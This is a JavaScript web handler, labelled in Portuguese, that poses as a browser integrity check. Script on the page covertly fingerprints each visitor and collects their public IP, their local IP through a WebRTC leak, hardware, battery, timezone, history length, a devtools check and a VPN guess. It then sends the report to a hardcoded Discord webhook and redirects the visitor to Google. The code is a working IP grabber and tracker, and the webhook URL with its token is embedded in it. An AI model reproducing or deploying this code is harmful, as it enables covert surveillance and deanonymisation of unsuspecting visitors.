export default async function handler(req, res) {
    const webhookURL = "https://discord.com/api/webhooks/1457145338161926276/zls4e-KmVOQwMrWLs_Ut-QR5N2R0mhpfKfw4BhVqUJOL-8mzELAZHk13rbJPlH4geFuv";

    if (req.method === 'POST') {
        const d = req.body;
        const h = req.headers;
        const ip = h['x-forwarded-for'] || req.socket.remoteAddress;

        const payload = {
            embeds: [{
                title: " RECONHECIMENTO : Extaridos",
                color: 0,
                fields: [
                    { name: " Rede & Conexão", value: `**IP:** ${ip}\n**Local:** ${d.localIp}\n**VPN:** ${d.vpnCheck}\n**Referrer:** ${d.referrer}`, inline: true },
                    { name: " Hardware", value: `**CPU:** ${d.cores}\n**RAM:** ${d.mem}GB\n**GPU:** ${d.vendor}\n**Bateria:** ${d.battery}`, inline: true },
                    { name: " Tela & Janela", value: `**Res:** ${d.res}\n**Win:** ${d.win}\n**Ratio:** ${d.pixelRatio}\n**Orientação:** ${d.orientation}`, inline: true },
                    { name: " Segurança", value: `**AdBlock:** ${d.adblock}\n**Bot:** ${d.isBot}\n**DevTools:** ${d.devTools}\n**PDF/Java:** ${d.pdf}/${d.java}`, inline: true },
                    { name: " Sistema", value: `**OS:** ${d.platform}\n**TZ:** ${d.tz}\n**Língua:** ${d.lang}\n**Histórico:** ${d.history}`, inline: true },
                    { name: " Sensores & Comportamento", value: `**Touch:** ${d.touch}\n**AudioID:** ${d.audioID}\n**Fonts:** ${d.fonts}\n**Dark:** ${d.darkMode}\n**Motion:** ${d.motion}`, inline: true },
                    { name: " Navegador", value: `\`\`\`${h['user-agent']}\`\`\`` }
                ],
                footer: { text: "Relatório de Reconhecimento" }
            }]
        };

        await fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
        return res.status(200).json({ status: 'ok' });
    }

    res.setHeader('Content-Type', 'text/html');
    res.send(`
        <script>
            async function getFinalData() {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                
                // Fingerprint de Áudio
                let audioID = "N/A";
                try {
                    const ctx = new (window.AudioContext || window.webkitAudioContext)();
                    audioID = ctx.sampleRate + '-' + ctx.destination.channelCount;
                } catch(e){}

                // IP Local
                const getIP = () => new Promise(r => {
                    const pc = new RTCPeerConnection(); pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
                    pc.onicecandidate = i => { if(i?.candidate?.candidate) { r(/([0-9]{1,3}(\\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1]); pc.close(); }};
                    setTimeout(() => r("N/A"), 800);
                });

                let batt = "N/A"; try { const b = await navigator.getBattery(); batt = \`\${Math.round(b.level*100)}% (\${b.charging?'C':'D'})\`; } catch(e){}

                const data = {
                    // Mantidos
                    res: \`\${screen.width}x\${screen.height}\`,
                    win: \`\${window.innerWidth}x\${window.innerHeight}\`,
                    cores: navigator.hardwareConcurrency,
                    mem: navigator.deviceMemory || "N/A",
                    gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A",
                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "N/A",
                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    lang: navigator.language,
                    touch: navigator.maxTouchPoints,
                    isBot: navigator.webdriver,
                    battery: batt,
                    localIp: await getIP(),
                    adblock: !document.getElementById('ad-detector'),
                    pdf: navigator.pdfViewerEnabled,
                    java: navigator.javaEnabled(),
                    platform: navigator.platform,
                    // 20 Novos Pontos de Dados
                    audioID: audioID,
                    fonts: document.fonts ? document.fonts.size : "N/A",
                    pixelRatio: window.devicePixelRatio,
                    referrer: document.referrer || "Direto",
                    history: window.history.length,
                    darkMode: window.matchMedia('(prefers-color-scheme: dark)').matches,
                    orientation: screen.orientation ? screen.orientation.type : "N/A",
                    devTools: (window.outerWidth - window.innerWidth > 160),
                    motion: !!window.DeviceMotionEvent,
                    vpnCheck: await fetch('https://portquiz.net:8080').then(()=>"Não").catch(()=>"Sim"),
                    cookies: navigator.cookieEnabled,
                    onLine: navigator.onLine,
                    memoryLimit: performance.memory ? Math.round(performance.memory.jsHeapSizeLimit/1024/1024) + "MB" : "N/A",
                    keyboard: navigator.keyboard ? "Sim" : "Não",
                    touchType: 'ontouchstart' in window ? "Capacitiva" : "Nenhuma",
                    plugins: navigator.plugins.length,
                    mimeType: navigator.mimeTypes.length,
                    vibrate: !!navigator.vibrate,
                    maxTouch: navigator.maxTouchPoints,
                    hardware: navigator.oscpu || "N/A"
                };

                await fetch('/api', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
                window.location.href = "https://www.google.com";
            }
            getFinalData();
        </script>
        <p>Verificando integridade do navegador...</p>
    `);
}
